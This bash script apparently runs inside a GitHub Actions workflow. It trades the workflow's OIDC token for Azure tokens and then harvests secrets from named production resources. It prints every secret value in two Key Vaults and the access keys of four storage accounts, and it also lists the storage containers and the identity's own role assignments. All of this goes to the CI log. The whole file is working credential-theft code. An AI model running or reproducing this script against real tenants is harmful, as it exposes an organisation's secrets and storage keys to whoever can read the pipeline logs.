#!/usr/bin/env bash
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
get_tok () {
  curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$JWT" -d "grant_type=client_credentials" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'
}
ARM=$(get_tok "https://management.azure.com/.default")
KV=$(get_tok "https://vault.azure.net/.default")
SUB=$AZURE_SUBSCRIPTION_ID
RG=rg-tbl-platform-prod-sea

for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "##### VAULT $V"
  LIST=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4&maxresults=25")
  echo "$LIST"
  for N in $(echo "$LIST" | python3 -c 'import sys,json
try:
  d=json.load(sys.stdin)
except Exception: d={}
for s in d.get("value") or []: print(s["id"].rsplit("/",1)[1])'); do
    echo "--- secret $N"
    curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets/$N?api-version=7.4"
    echo
  done
done

echo "##### STORAGE"
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- listKeys $SA"
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | head -c 1200
  echo
  echo "--- containers $SA"
  curl -sS -H "Authorization: Bearer $ARM" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/blobServices/default/containers?api-version=2023-01-01" | head -c 2000
  echo
done

echo "##### ROLE ASSIGNMENTS (self)"
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=atScope()" | head -c 4000
echo
echo "=== end ==="
